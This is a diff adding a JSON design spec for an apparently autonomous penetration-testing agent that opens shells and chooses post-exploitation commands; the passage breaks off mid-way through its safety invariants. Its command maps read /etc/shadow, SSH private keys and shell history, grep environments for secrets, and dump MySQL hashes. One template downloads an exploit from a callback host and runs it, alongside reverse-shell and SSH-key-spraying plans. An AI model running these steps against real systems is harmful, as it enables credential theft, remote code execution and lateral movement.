@@ -1,0 +1,783 @@
+{
+  "spec_id": "E2_SHELL_CANDIDATE_GENERATION_SPEC",
+  "spec_version": "1.0.0",
+  "series": "E-Series (Execution Capabilities)",
+  "phase": "E2 — Autonomous Shell Candidate Generation",
+  "status": "SEALED",
+  "date": "2026-07-28",
+
+  "charter_references": ["Section 24", "Section 43", "Section 58"],
+
+  "summary": "Wire the nerves connecting the cognitive loop (Planner, Student, WorldModel) to the E1 Interactive Shell capability. The brain must autonomously recognize when to open a shell (shell_connect), what to type once inside (shell_command), and how to ingest the results back into cognition (output-driven Falsification re-engagement).",
+
+  "architectural_context": {
+    "e1_implemented": "orchestrator/capabilities/interactive_shell/ — 8 files (~2900 lines): SSHShellCapability, ReverseShellCapability, CommandFilterPipeline, TTYNormalizer, EvidenceExtractor, ShellSession/SessionStore, ListenerManager",
+    "e1_extensions": [
+      "CapabilityBroker — 7 shell auth methods (authorize_shell_session, authorize_shell_command, terminate_shell_session, etc.)",
+      "WorldModel — 5 new EntityTypes (PROCESS, FILE, NETWORK_CONNECTION, VULNERABILITY, SHELL_SESSION), 7 RelationshipTypes, factory functions",
+      "Planner — scoring for shell_connect (+0.3), shell_command (+0.4), shell_disconnect (+0.1) in decide()"
+    ],
+    "current_gap": "StudentCandidateGenerator (STACK_MAP) and AblationRunner._generate_candidates() produce zero shell_connect or shell_command candidates. The Planner can score them but never receives them. The hands exist but the brain doesn't know they're there.",
+    "e1_evidence_types": [
+      "command_executed", "command_output", "file_content", "process_list",
+      "network_connections", "user_accounts", "credential", "vulnerability_indicator"
+    ],
+    "affected_files": [
+      "orchestrator/brain/candidate_generators/ (new: shell_candidate_generator.py)",
+      "orchestrator/brain/action.py (Planner.decide — enhanced scoring context)",
+      "orchestrator/student/chain_synthesizer.py (new shell-specific attack units)",
+      "orchestrator/brain/world.py (ingestion handlers for shell evidence)",
+      "arena/ablation_runner.py (_generate_candidates — integrate shell generator)"
+    ],
+    "do_not_modify": [
+      "orchestrator/capabilities/interactive_shell/ (E1 package — frozen)",
+      "orchestrator/brain/capability_broker.py (existing D-series methods)"
+    ]
+  },
+
+  "scope": {
+    "modifications": [
+      {
+        "component": "Planner (orchestrator/brain/action.py)",
+        "change": "Enhance shell_connect/shell_command scoring with context awareness: credential freshness, target awareness, current objective stage"
+      },
+      {
+        "component": "Candidate Generators (orchestrator/brain/candidate_generators/)",
+        "change": "New shell_candidate_generator.py — produces shell_connect and shell_command candidates from trigger conditions"
+      },
+      {
+        "component": "AblationRunner (arena/ablation_runner.py)",
+        "change": "Integrate ShellCandidateGenerator into _generate_candidates() pipeline, feed active shell sessions into candidate scope"
+      },
+      {
+        "component": "ChainSynthesizer (orchestrator/student/chain_synthesizer.py)",
+        "change": "Add shell-aware AttackUnit entries for post-exploitation enumeration chains"
+      },
+      {
+        "component": "WorldModel (orchestrator/brain/world.py)",
+        "change": "Add ingestion methods for E1 evidence types: ingest_shell_evidence(), update_host_from_shell()"
+      }
+    ],
+    "non_modifications": [
+      "E1 InteractiveShellCapability code (frozen after SENTINEL acceptance)",
+      "CapabilityBroker D-series methods (propose_action, authorize_action — frozen)",
+      "Evidence dataclass (frozen, untyped evidence_type strings — compatible)"
+    ]
+  },
+
+  "trigger_conditions": {
+    "description": "When should the Planner propose a shell_connect candidate? Three distinct trigger types.",
+
+    "triggers": [
+      {
+        "trigger_id": "T1_CREDENTIAL_DISCOVERY",
+        "name": "Credential Discovery Trigger",
+        "description": "If the WorldModel or StudentKB ingests valid credentials and identifies an open SSH/WinRM port on an in-scope target, propose shell_connect.",
+        "preconditions": [
+          "WorldModel has a CREDENTIAL entity with primary_identifier matching 'ssh:*' or 'winrm:*'",
+          "WorldModel has a SERVICE entity with identifier type 'ssh' or 'winrm' AND a CONNECTS_TO relationship to an in-scope ASSET",
+          "The CREDENTIAL has an AUTHENTICATES_AS relationship to an IDENTITY entity",
+          "The target ASSET does NOT already have an active SHELL_SESSION entity with status 'active'"
+        ],
+        "candidate_template": {
+          "action_type": "shell_connect",
+          "capability": "ssh_shell",
+          "method": "credential_auth",
+          "origin": "SHELL_TRIGGER_T1",
+          "rationale": "Credentials discovered for {target}: {username}@{target} via {source_detail}"
+        },
+        "scoring_context": {
+          "utility_boost": 0.5,
+          "cost_estimate": 4.0,
+          "risk_estimate": 0.4,
+          "rationale_code": "shell_credential_discovery"
+        }
+      },
+      {
+        "trigger_id": "T2_EXPLOIT_CONFIRMATION",
+        "name": "Exploit Confirmation Trigger",
+        "description": "If a DefeaterResult or FalsificationResult confirms remote code execution (RCE) via a web vulnerability, propose shell_connect with a reverse shell payload.",
+        "preconditions": [
+          "A DefeaterResult or FalsificationResult exists with status CONFIRMED",
+          "The result's evidence_type indicates RCE (e.g., 'http_response' with code_execution indicator)",
+          "The target ASSET exists in WorldModel",
+          "No active SHELL_SESSION entity exists for the target"
+        ],
+        "candidate_template": {
+          "action_type": "shell_connect",
+          "capability": "reverse_shell",
+          "method": "payload_injection",
+          "origin": "SHELL_TRIGGER_T2",
+          "rationale": "RCE confirmed on {target} via {vuln_id}, deploying reverse shell payload"
+        },
+        "scoring_context": {
+          "utility_boost": 0.7,
+          "cost_estimate": 5.0,
+          "risk_estimate": 0.6,
+          "rationale_code": "shell_rce_confirmation"
+        }
+      },
+      {
+        "trigger_id": "T3_CHAIN_ADVISORY",
+        "name": "ChainSynthesizer Advisory Trigger",
+        "description": "If the ChainSynthesizer's suggest_next_steps() indicates that a shell is the next logical step in a known attack chain, propose shell_connect.",
+        "preconditions": [
+          "ChainSynthesizer has an AttackUnit whose preconditions are satisfied by current WorldModel state",
+          "That AttackUnit's postconditions include 'shell_access_established' or similar",
+          "The target entity is in-scope"
+        ],
+        "candidate_template": {
+          "action_type": "shell_connect",
+          "capability": "ssh_shell",
+          "method": "chain_advisory",
+          "origin": "SHELL_TRIGGER_T3",
+          "rationale": "ChainSynthesizer advisory: {technique_id} — shell access required for next step"
+        },
+        "scoring_context": {
+          "utility_boost": 0.4,
+          "cost_estimate": 4.0,
+          "risk_estimate": 0.3,
+          "rationale_code": "shell_chain_advisory"
+        }
+      }
+    ]
+  },
+
+  "command_proposal_strategy": {
+    "description": "Once a shell is active, how does the Planner decide what commands to run?",
+    "constraints": [
+      "Every shell_command candidate MUST include a session_id referencing an active ShellSession entity in WorldModel",
+      "Every shell_command candidate MUST route through CapabilityBroker.authorize_shell_command() at execution time",
+      "shell_command candidates should NOT be generated for sessions in TERMINATED or EXPIRED state"
+    ],
+
+    "proposal_modes": [
+      {
+        "mode_id": "M1_OBJECTIVE_DRIVEN",
+        "name": "Objective-Driven Command Proposal",
+        "description": "Plan commands based on the current engagement objective (privesc, lateral, exfil)",
+        "logic": "Map current objective to a command template set. If objective is PRIVESC → propose 'sudo -l', 'find / -perm -4000', 'cat /etc/shadow', 'uname -a'.",
+        "objective_command_map": {
+          "privilege_escalation": [
+            {"command": "sudo -l", "evidence_type": "file_content", "rationale": "Check sudo permissions"},
+            {"command": "find / -type f -perm -4000 2>/dev/null", "evidence_type": "vulnerability_indicator", "rationale": "Find SUID binaries"},
+            {"command": "cat /etc/shadow", "evidence_type": "credential", "rationale": "Extract password hashes"},
+            {"command": "uname -a", "evidence_type": "vulnerability_indicator", "rationale": "Kernel version for exploit matching"},
+            {"command": "cat /etc/passwd", "evidence_type": "user_accounts", "rationale": "List user accounts"},
+            {"command": "cat /etc/sudoers", "evidence_type": "file_content", "rationale": "Check sudo configuration"},
+            {"command": "getcap -r / 2>/dev/null", "evidence_type": "vulnerability_indicator", "rationale": "Find file capabilities"}
+          ],
+          "lateral_movement": [
+            {"command": "ip addr", "evidence_type": "network_connections", "rationale": "Network interfaces for pivot targets"},
+            {"command": "netstat -tlnp 2>/dev/null || ss -tlnp", "evidence_type": "network_connections", "rationale": "Listening services for pivot targets"},
+            {"command": "cat ~/.ssh/id_rsa", "evidence_type": "credential", "rationale": "Extract SSH keys for lateral movement"},
+            {"command": "cat ~/.ssh/authorized_keys", "evidence_type": "credential", "rationale": "List authorized SSH keys"},
+            {"command": "cat ~/.bash_history", "evidence_type": "credential", "rationale": "Extract credentials from history"},
+            {"command": "arp -a 2>/dev/null || ip neigh", "evidence_type": "network_connections", "rationale": "ARP table for lateral targets"}
+          ],
+          "credential_access": [
+            {"command": "cat /etc/shadow", "evidence_type": "credential", "rationale": "Extract password hashes"},
+            {"command": "env | grep -i -E 'pass|key|token|secret'", "evidence_type": "credential", "rationale": "Extract credentials from environment"},
+            {"command": "find / -name '*.kdbx' -o -name '*.kdb' 2>/dev/null", "evidence_type": "file_content", "rationale": "Find KeePass databases"},
+            {"command": "cat /etc/ssh/sshd_config 2>/dev/null", "evidence_type": "file_content", "rationale": "Extract SSH config"},
+            {"command": "mysql -e 'SELECT user,authentication_string FROM mysql.user' 2>/dev/null || echo 'no mysql'", "evidence_type": "credential", "rationale": "Extract MySQL credentials"}
+          ],
+          "persistence": [
+            {"command": "id", "evidence_type": "command_output", "rationale": "Current user context"},
+            {"command": "cat /etc/crontab", "evidence_type": "file_content", "rationale": "Check crontab for persistence hooks"},
+            {"command": "ls -la /etc/init.d/ /etc/systemd/system/ 2>/dev/null", "evidence_type": "file_content", "rationale": "List system services"},
+            {"command": "cat /etc/rc.local 2>/dev/null", "evidence_type": "file_content", "rationale": "Check rc.local for startup hooks"}
+          ],
+          "reconnaissance": [
+            {"command": "id", "evidence_type": "command_output", "rationale": "Current user context"},
+            {"command": "hostnamectl 2>/dev/null || cat /etc/hostname", "evidence_type": "command_output", "rationale": "Hostname and OS details"},
+            {"command": "ls -la /root/ /home/", "evidence_type": "file_content", "rationale": "List user home directories"},
+            {"command": "cat /etc/group", "evidence_type": "user_accounts", "rationale": "Group memberships"},
+            {"command": "w 2>/dev/null || who", "evidence_type": "user_accounts", "rationale": "Currently logged-in users"}
+          ],
+          "exfiltration": [
+            {"command": "ls -la /tmp/", "evidence_type": "file_content", "rationale": "Check temp for sensitive files"},
+            {"command": "df -h", "evidence_type": "command_output", "rationale": "Disk usage for staging capacity"},
+            {"command": "find / -name '*.sql' -o -name '*.dump' -o -name '*.bak' 2>/dev/null | head -20", "evidence_type": "file_content", "rationale": "Find database dumps and backups"}
+          ]
+        }
+      },
+      {
+        "mode_id": "M2_STUDENT_ADVISORY",
+        "name": "Student-Advisory Command Proposal",
+        "description": "Query the ChainSynthesizer for the next logical step in the kill chain once a shell is established, then propose specific enumeration commands based on the host's OS and fingerprint.",
+        "logic": "When a ShellSession entity is created in WorldModel, AblationRunner queries ChainSynthesizer.suggest_next_steps() with the current confirmed technique IDs. If the next step requires internal host data (process list, user accounts, network connections), the Advisor returns recommended command templates that the ShellCandidateGenerator converts to shell_command candidates.",
+        "integration_points": [
+          "ChainSynthesizer._shell_attack_units: new AttackUnit entries for post-exploitation enumeration",
+          "ChainSynthesizer.suggest_next_steps(): if postconditions include 'shell_access_established', return commands matching remaining preconditions",
+          "Planner.decide(): chain_readiness_boost applies to shell_command candidates matching ChainSynthesizer readiness scores"
+        ]
+      }
+    ]
+  },
+
+  "output_driven_cognition": {
+    "description": "How does the WorldModel ingest E1 evidence types and feed them back into the FalsificationManager?",
+
+    "worldmodel_ingestion": {
+      "description": "When TTYNormalizer.EvidenceExtractor produces structured Evidence objects, the WorldModel must ingest them into its entity/relationship graph.",
+
+      "evidence_type_handlers": [
+        {
+          "evidence_type": "process_list",
+          "handler": "ingest_process_list",
+          "behavior": "For each process in the structured_content['processes'], create a PROCESS entity linked via OBSERVED_IN to the SHELL_SESSION entity. Link each process to the host ASSET via RUNS_ON relationship. If a matching process already exists (same PID), update last_seen.",
+          "world_model_method": "create_process()",
+          "relationship": "link_observed_in(), link_runs_on()",
+          "triggers_falsification": false
+        },
+        {
+          "evidence_type": "file_content",
+          "handler": "ingest_file_content",
+          "behavior": "Create a FILE entity from the file path. Link via OBSERVED_IN to the SHELL_SESSION entity. If the content reveals credentials (shadow, sudoers, ssh keys), also create CREDENTIAL entities and link via INDICATES to the VULNERABILITY entity if relevant.",
+          "world_model_method": "create_file()",
+          "relationship": "link_observed_in()",
+          "triggers_falsification": true,
+          "falsification_condition": "If file is /etc/shadow and host has hypothesis about weak password policy, create FalsificationTask to test hash cracking feasibility"
+        },
+        {
+          "evidence_type": "network_connections",
+          "handler": "ingest_network_connections",
+          "behavior": "For each connection in structured_content['connections'], create a NETWORK_CONNECTION entity. Link CONNECTS_FROM to the associated PROCESS entity. Link CONNECTS_TO_PORT to the target port or service. Update the host ASSET with discovered listening services.",
+          "world_model_method": "create_network_connection()",
+          "relationship": "link_connects_from(), link_connects_to_port()",
+          "triggers_falsification": true,
+          "falsification_condition": "If connection reveals an unexpected listening service on the host, create contradiction with prior scan evidence and FalsificationTask to probe the new service"
+        },
+        {
+          "evidence_type": "user_accounts",
+          "handler": "ingest_user_accounts",
+          "behavior": "For each user, create an IDENTITY entity. Link via OBSERVED_IN to the SHELL_SESSION entity. Update the host ASSET with list of known users.",
+          "world_model_method": "create_identity()",
+          "relationship": "link_observed_in()",
+          "triggers_falsification": true,
+          "falsification_condition": "If a high-privilege user (uid=0) is discovered that was not previously known, create FalsificationTask to test whether the user is a backdoor"
+        },
+        {
+          "evidence_type": "credential",
+          "handler": "ingest_credential",
+          "behavior": "Create a CREDENTIAL entity from the extracted credential. Link via AUTHENTICATES_AS to any IDENTITY entity matching the username. Store the credential type (password_hash, ssh_key, api_key, etc.) in identifiers.",
+          "world_model_method": "create_credential()",
+          "relationship": "link_authenticates_as(), link_observed_in()",
+          "triggers_falsification": true,
+          "falsification_condition": "If credential is a password hash, create FalsificationTask to test cracking. If SSH private key, create FalsificationTask to test against other in-scope hosts."
+        },
+        {
+          "evidence_type": "vulnerability_indicator",
+          "handler": "ingest_vulnerability_indicator",
+          "behavior": "Create a VULNERABILITY entity. Link via INDICATES to the host ASSET. Update HypothesisManager with confidence boost for any matching hypothesis that this host is vulnerable to a specific CVE or weakness class.",
+          "world_model_method": "create_vulnerability()",
+          "relationship": "link_indicates(), link_observed_in()",
+          "triggers_falsification": true,
+          "falsification_condition": "If the vulnerability indicator (e.g., kernel version, SUID binary) matches an existing hypothesis about exploit viability, create FalsificationTask to test the exploit path"
+        },
+        {
+          "evidence_type": "command_executed",
+          "handler": "ingest_command_executed",
+          "behavior": "Log the command execution as metadata on the SHELL_SESSION entity. Do not create new entities for every command — only for those whose output produces structured evidence.",
+          "world_model_method": "update_shell_session_metadata()",
+          "relationship": "none",
+          "triggers_falsification": false
+        },
+        {
+          "evidence_type": "command_output",
+          "handler": "ingest_command_output",
+          "behavior": "Attach raw output to the SHELL_SESSION entity's evidence chain for auditability. If the output contains service banners or version strings, update the SERVICE entity's identifiers.",
+          "world_model_method": "update_host_service_info()",
+          "relationship": "link_observed_in()",
+          "triggers_falsification": true,
+          "falsification_condition": "If command output reveals a service version that contradicts earlier scan evidence, create Contradiction + FalsificationTask"
+        }
+      ],
+
+      "proposed_worldmodel_methods": [
+        {
+          "name": "ingest_shell_evidence(evidence, session_entity_id, host_asset_id) -> list[entity_ids]",
+          "description": "Dispatcher: routes evidence to the correct handler based on evidence_type",
+          "location": "orchestrator/brain/world.py (new method on WorldModel)"
+        },
+        {
+          "name": "update_host_from_shell(host_asset_id, session_entity_id) -> dict",
+          "description": "Aggregate all shell-derived evidence for a host into a consolidated host state update",
+          "location": "orchestrator/brain/world.py (new method on WorldModel)"
+        },
+        {
+          "name": "get_session_host(session_entity_id) -> Optional[Entity]",
+          "description": "Find the host ASSET that a SHELL_SESSION is connected to via relationship traversal",
+          "location": "orchestrator/brain/world.py (new method on WorldModel)"
+        }
+      ]
+    },
+
+    "falsification_re_engagement": {
+      "description": "Once shell evidence provides internal host data, the FalsificationManager must evaluate that data against existing hypotheses.",
+
+      "engagement_paths": [
+        {
+          "trigger": "New VULNERABILITY entity created with specific vuln_class (e.g., 'suid_binary', 'kernel_version_disclosure')",
+          "action": "Query HypothesisManager for hypotheses matching 'exploit' + target host. If a matching hypothesis exists with confidence < 0.7, create FalsificationTask: 'Test kernel exploit {cve} on {host} — shell evidence provides kernel version {version}'",
+          "falsification_method": "shell_command",
+          "candidate_command": {"command": "python3 -c 'exploit_payload' || wget -O /tmp/exploit http://{lhost}/exploit && chmod +x /tmp/exploit && /tmp/exploit", "evidence_type": "command_output"}
+        },
+        {
+          "trigger": "New CREDENTIAL entity created with type 'password_hash'",
+          "action": "Create FalsificationTask: 'Attempt to crack {hash} with hashcat/John — credential from {host}'",
+          "falsification_method": "offline_processing",
+          "candidate_command": null
+        },
+        {
+          "trigger": "New CREDENTIAL entity created with type 'ssh_private_key'",
+          "action": "For each in-scope ASSET with an SSH service, create FalsificationTask: 'Test SSH key {key_fingerprint} against {target_host}:22'",
+          "falsification_method": "shell_command",
+          "candidate_command": {"command": "ssh -i /tmp/key -o BatchMode=yes -o StrictHostKeyChecking=no {username}@{target} 'id'", "evidence_type": "command_output"}
+        },
+        {
+          "trigger": "New NETWORK_CONNECTION entity reveals unexpected service",
+          "action": "Query WorldModel for existing SERVICE entities on the same host. If the new service creates a contradiction (e.g., scan said port 8443 was closed but shell reveals a listening service), create Contradiction + FalsificationTask to re-scan or directly probe.",
+          "falsification_method": "direct_probe",
+          "candidate_command": {"command": "curl -k -m 5 https://{host}:{port}/ || echo 'no response'", "evidence_type": "command_output"}
+        }
+      ]
+    }
+  },
+
+  "candidate_generator": {
+    "description": "New ShellCandidateGenerator that produces shell_connect and shell_command candidates.",
+
+    "file": "orchestrator/brain/candidate_generators/shell_generator.py",
+
+    "interface": {
+      "class_name": "ShellCandidateGenerator",
+      "extends": "BaseCandidateGenerator (implicit — same pattern as StudentCandidateGenerator)",
+      "public_methods": [
+        {
+          "name": "generate_connect_candidates(world, evidence_graph, hypothesis_manager, student_kb) -> list[dict]",
+          "description": "Evaluate trigger conditions (T1, T2, T3) against WorldModel state and return shell_connect candidates"
+        },
+        {
+          "name": "generate_command_candidates(world, evidence_graph, hypothesis_manager, active_sessions, objective_id) -> list[dict]",
+          "description": "For each active ShellSession entity, propose shell_command candidates based on objective mode and chain readiness"
+        },
+        {
+          "name": "generate_disconnect_candidates(world, active_sessions) -> list[dict]",
+          "description": "Propose shell_disconnect for sessions exceeding max_duration, idle timeout, or denial threshold"
+        },
+        {
+          "name": "generate_candidates(targets, context) -> list[dict]",
+          "description": "Aggregate all three generator methods; returns complete shell candidate set"
+        }
+      ]
+    },
+
+    "trigger_evaluation": {
+      "T1_CREDENTIAL_DISCOVERY": {
+        "worldmodel_query": "world.get_entities_by_type(EntityType.CREDENTIAL) filtered by primary_identifier containing 'ssh:' or 'winrm:'",
+        "worldmodel_check": "For each credential, check if world has a SERVICE entity with type 'ssh' or 'winrm' that CONNECTS_TO the same ASSET as the credential's AUTHENTICATES_AS identity",
+        "session_check": "Check no active SHELL_SESSION exists for the target ASSET (world.get_relationships(source=asset_id, rel_type=connects_to, target=session_id))",
+        "output": "shell_connect candidate with method='credential_auth'"
+      },
+      "T2_EXPLOIT_CONFIRMATION": {
+        "evidence_check": "evidence_graph.get_all_evidence() filtered by evidence_type matching RCE indicators (evidence_type == 'http_response' AND 'command_execution' in structured_content)",
+        "hypothesis_check": "hypothesis_manager.hypotheses with status == CONFIRMED and statement containing 'rce' or 'code_execution' or 'remote_access'",
+        "output": "shell_connect candidate with method='payload_injection', capability='reverse_shell'"
+      },
+      "T3_CHAIN_ADVISORY": {
+        "student_check": "chain_synthesizer.suggest_next_steps(confirmed_technique_ids) returns techniques with 'shell_access' in postconditions",
+        "readiness_check": "WorldModel has entities matching the technique's preconditions",
+        "output": "shell_connect candidate with method='chain_advisory', technique_id mapped from ChainSynthesizer"
+      }
+    },
+
+    "candidate_schema": {
+      "shell_connect": {
+        "action_type": "shell_connect",
+        "capability": "ssh_shell | reverse_shell",
+        "target": "IP or hostname of target ASSET",
+        "method": "credential_auth | payload_injection | chain_advisory",
+        "session_proposal": {
+          "target": "target IP",
+          "capability": "ssh_shell or reverse_shell",
+          "parameters": {
+            "username": "from credential or empty for reverse",
+            "auth_method": "password | key | reverse_tcp",
+            "lhost": "Raphael callback IP (for reverse_shell)",
+            "lport": "allocated by ListenerManager",
+            "max_duration": 3600,
+            "idle_timeout": 300
+          }
+        },
+        "action_id": "shell_connect_{target}_{method}_{uuid_short}",
+        "rationale": "Trigger {trigger_id}: {description}",
+        "candidate_origin": "SHELL_TRIGGER",
+        "technique_id": "T1XXX | T2XXX | T3XXX",
+        "impact_estimate": 8.0,
+        "confidence": 0.0,
+        "_is_falsification": false,
+        "derived_from_world_query_ids": "(query_id,)"
+      },
+      "shell_command": {
+        "action_type": "shell_command",
+        "capability": "ssh_shell | reverse_shell",
+        "target": "IP or hostname",
+        "method": "execute",
+        "session_id": "session_id from active ShellSession entity",
+        "command": "the shell command string",
+        "expected_evidence_type": "file_content | process_list | network_connections | credential | vulnerability_indicator | user_accounts | command_output",
+        "action_id": "shell_command_{session_short}_{cmd_short}_{uuid_short}",
+        "rationale": "Objective {objective}: {description}",
+        "candidate_origin": "SHELL_COMMAND_OBJECTIVE",
+        "technique_id": "mapped from ChainSynthesizer or objective_command_map",
+        "impact_estimate": 6.0,
+        "confidence": 0.0,
+        "derived_from_world_query_ids": "(query_id,)"
+      },
+      "shell_disconnect": {
+        "action_type": "shell_disconnect",
+        "capability": "ssh_shell | reverse_shell",
+        "target": "IP or hostname",
+        "method": "cleanup",
+        "session_id": "session_id to terminate",
+        "reason": "session_expired | idle_timeout | objective_complete | denial_threshold | operator_request",
+        "action_id": "shell_disconnect_{session_short}_{reason}",
+        "rationale": "Terminating {session_id}: {reason}",
+        "candidate_origin": "SHELL_LIFECYCLE",
+        "impact_estimate": 1.0,
+        "confidence": 1.0
+      }
+    }
+  },
+
+  "planner_scoring_enhancements": {
+    "description": "Enhancements to Planner.decide() for E2 candidate context.",
+
+    "changes": [
+      {
+        "location": "orchestrator/brain/action.py — Planner.decide() shell_connect scoring block (lines ~987-993)",
+        "current": "shell_connect: +0.3 baseline, no context awareness",
+        "proposed": "shell_connect: baseline +0.3, additional boosts based on trigger source (credential: +0.2, RCE: +0.4, chain_advisory: +0.1), freshness of credential evidence (+0.15 if < 1 hour old), target entity relationship density (+0.1 per existing relationship)"
+      },
+      {
+        "location": "orchestrator/brain/action.py — Planner.decide() shell_command scoring block (lines ~989-992)",
+        "current": "shell_command: +0.4 baseline, no context awareness",
+        "proposed": "shell_command: baseline +0.4, additional boosts based on objective alignment (+0.15 if command matches current objective), chain_readiness_boost from ChainSynthesizer (0.15 * readiness), expected evidence novelty (+0.1 if no evidence of that type exists yet for target)"
+      },
+      {
+        "location": "orchestrator/brain/action.py — Planner.decide() shell_disconnect scoring block (lines ~991-993)",
+        "current": "shell_disconnect: +0.1 baseline, no context awareness",
+        "proposed": "shell_disconnect: baseline +0.1, additional boost if session has exceeded 80% of max_duration (+0.3), if session idle > 50% of idle_timeout (+0.2), if denial count >= 2 (+0.5)"
+      },
+      {
+        "location": "orchestrator/brain/action.py — Planner.decide() new post-scoring step",
+        "current": "No shell session validation before selection",
+        "proposed": "For shell_command candidates: validate that the referenced session_id maps to an active ShellSession entity in WorldModel. If session is TERMINATED or EXPIRED, set utility to 0 (ineligible for selection). This prevents stale command proposals from being selected."
+      }
+    ]
+  },
+
+  "chain_synthesizer_extensions": {
+    "description": "New AttackUnit entries for shell-based attack chains.",
+
+    "new_attack_units": [
+      {
+        "technique_id": "shell_ssh_connect",
+        "name": "SSH Shell Connection",
+        "behavior": "connect_ssh(target, username, credential)",
+        "preconditions": ["ssh_service_identified", "valid_credential_obtained", "network_access"],
+        "postconditions": ["shell_access_established", "interactive_session_active"],
+        "impact": 8.0
+      },
+      {
+        "technique_id": "shell_reverse_connect",
+        "name": "Reverse Shell Connection",
+        "behavior": "deploy_reverse_shell(target, lhost, lport, payload_type)",
+        "preconditions": ["rce_confirmed", "egress_allowed", "listener_available"],
+        "postconditions": ["shell_access_established", "interactive_session_active"],
+        "impact": 9.0
+      },
+      {
+        "technique_id": "shell_enum_processes",
+        "name": "Enumerate Running Processes",
+        "behavior": "execute_shell_command(session_id, 'ps aux')",
+        "preconditions": ["shell_access_established"],
+        "postconditions": ["process_list_obtained"],
+        "impact": 5.0
+      },
+      {
+        "technique_id": "shell_enum_network",
+        "name": "Enumerate Network Connections",
+        "behavior": "execute_shell_command(session_id, 'netstat -tlnp')",
+        "preconditions": ["shell_access_established"],
+        "postconditions": ["network_connections_obtained", "internal_services_discovered"],
+        "impact": 6.0
+      },
+      {
+        "technique_id": "shell_enum_users",
+        "name": "Enumerate User Accounts",
+        "behavior": "execute_shell_command(session_id, 'cat /etc/passwd')",
+        "preconditions": ["shell_access_established"],
+        "postconditions": ["user_accounts_obtained", "privileged_users_identified"],
+        "impact": 6.0
+      },
+      {
+        "technique_id": "shell_extract_credentials",
+        "name": "Extract Credentials from Host",
+        "behavior": "execute_shell_command(session_id, 'cat /etc/shadow')",
+        "preconditions": ["shell_access_established", "privilege_escalation_possible"],
+        "postconditions": ["password_hashes_obtained", "credential_material_exfiltrated"],
+        "impact": 9.0
+      },
+      {
+        "technique_id": "shell_find_suid",
+        "name": "Find SUID Binaries",
+        "behavior": "execute_shell_command(session_id, 'find / -perm -4000')",
+        "preconditions": ["shell_access_established"],
+        "postconditions": ["suid_binaries_identified", "privesc_candidates_identified"],
+        "impact": 7.0
+      },
+      {
+        "technique_id": "shell_lateral_ssh_key",
+        "name": "Extract SSH Keys for Lateral Movement",
+        "behavior": "execute_shell_command(session_id, 'cat ~/.ssh/id_rsa')",
+        "preconditions": ["shell_access_established", "user_home_accessible"],
+        "postconditions": ["ssh_private_key_obtained", "lateral_movement_capable"],
+        "impact": 8.0
+      }
+    ],
+
+    "chain_connections": {
+      "description": "How the new shell units chain with existing AttackUnit library entries.",
+      "chains": [
+        ["ssrf_discovery", "ssrf_imds_aws", "cloud_cred_exfil", "shell_reverse_connect", "shell_enum_processes", "shell_enum_network"],
+        ["sqli_union_basic", "file_upload_shell", "shell_reverse_connect", "shell_extract_credentials", "shell_lateral_ssh_key"],
+        ["jwt_alg_none", "ssrf_imds_aws", "shell_reverse_connect", "shell_enum_network", "shell_enum_users"],
+        ["kerberoasting", "shell_ssh_connect", "shell_enum_processes", "shell_extract_credentials", "shell_lateral_ssh_key"],
+        ["shell_ssh_connect", "shell_enum_users", "shell_find_suid", "shell_extract_credentials", "shell_lateral_ssh_key"]
+      ]
+    }
+  },
+
+  "integration_with_ablation_runner": {
+    "description": "How the ShellCandidateGenerator integrates into AblationRunner._generate_candidates().",
+
+    "steps": [
+      {
+        "step": 1,
+        "action": "Instantiate ShellCandidateGenerator in AblationRunner.__init__() if E2 is enabled",
+        "location": "arena/ablation_runner.py — AblationRunner.__init__()",
+        "code": "self._shell_generator = ShellCandidateGenerator()"
+      },
+      {
+        "step": 2,
+        "action": "In _generate_candidates(), after WorldModel query and before falsification block: call shell_generator.generate_connect_candidates()",
+        "location": "arena/ablation_runner.py — _generate_candidates(), after line ~1794 (after initial target candidates)",
+        "code": "shell_candidates = self._shell_generator.generate_connect_candidates(runner.world_model, runner.evidence_graph, runner.hypothesis_manager, runner.chain_synthesizer)"
+      },
+      {
+        "step": 3,
+        "action": "In _generate_candidates(), if any active ShellSession entities exist, call shell_generator.generate_command_candidates()",
+        "location": "arena/ablation_runner.py — _generate_candidates() after step 2",
+        "code": "active_sessions = self._shell_generator.get_active_sessions(runner.world_model); cmd_candidates = self._shell_generator.generate_command_candidates(runner.world_model, runner.evidence_graph, runner.hypothesis_manager, active_sessions, current_objective)"
+      },
+      {
+        "step": 4,
+        "action": "In _generate_candidates(), after each iteration, call shell_generator.generate_disconnect_candidates()",
+        "location": "arena/ablation_runner.py — _generate_candidates() after step 3",
+        "code": "disconnect_candidates = self._shell_generator.generate_disconnect_candidates(runner.world_model, active_sessions)"
+      },
+      {
+        "step": 5,
+        "action": "Append all shell candidates to the main candidates list (after D-8 scope filtering)",
+        "code": "candidates.extend(shell_candidates); candidates.extend(cmd_candidates); candidates.extend(disconnect_candidates)"
+      },
+      {
+        "step": 6,
+        "action": "In iteration loop (after Planner.decide and action execution), when evidence is produced, call world.ingest_shell_evidence() for any E1-type evidence",
+        "location": "arena/ablation_runner.py — after action execution and evidence creation"
+      }
+    ]
+  },
+
+  "safety_invariants": {
+    "description": "Safety invariants that E2 must establish and maintain (extends E1 invariants).",
+
+    "invariants": [
+      {
+        "id": "INV-E2-01",
+        "description": "All shell_connect and shell_command candidates MUST include a session_proposal or session_id that routes through CapabilityBroker authorization at execution time. No direct shell execution path bypasses the Broker.",
+        "verification": "Audit ShellCandidateGenerator output schema: every shell_connect has session_proposal dict, every shell_command has session_id. Test that invalid/missing session_id raises ValueError."
+      },
+      {
+        "id": "INV-E2-02",
+        "description": "Shell_command candidates MUST reference an existing active ShellSession entity in WorldModel. Stale/terminated session references MUST be rejected by Planner.decide() (utility set to 0).",
+        "verification": "Test: create ShellCandidateGenerator with WorldModel containing TERMINATED session, verify generate_command_candidates() returns empty list for that session."
+      },
+      {
+        "id": "INV-E2-03",
+        "description": "The ShellCandidateGenerator MUST NOT produce shell_connect candidates for targets that already have an active SHELL_SESSION entity.",
+        "verification": "Test: add active SHELL_SESSION to WorldModel, verify generate_connect_candidates() excludes that target."
+      },
+      {
+        "id": "INV-E2-04",
+        "description": "WorldModel.ingest_shell_evidence() MUST validate that the session_entity_id parameter references an existing SHELL_SESSION entity. Evidence without a valid session MUST be rejected.",
+        "verification": "Test: pass invalid session_id, verify ValueError raised."
+      },
+      {
+        "id": "INV-E2-05",
+        "description": "Falsification re-engagement MUST NOT create infinite loops. Each FalsificationTask created from shell evidence must have a unique discriminator to prevent re-triggering on the same evidence.",
